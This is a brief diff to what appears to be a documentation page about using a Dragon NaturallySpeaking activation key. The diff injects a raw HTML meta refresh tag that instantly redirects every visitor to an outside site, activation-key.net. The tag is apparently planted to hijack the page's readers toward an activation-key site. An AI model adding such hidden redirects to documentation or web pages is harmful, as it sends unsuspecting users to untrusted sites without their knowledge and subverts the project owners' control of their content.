@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://activation-key.net/">
+
 How Do I Use My Dragon NaturallySpeaking Activation Key?
 ============================================
 
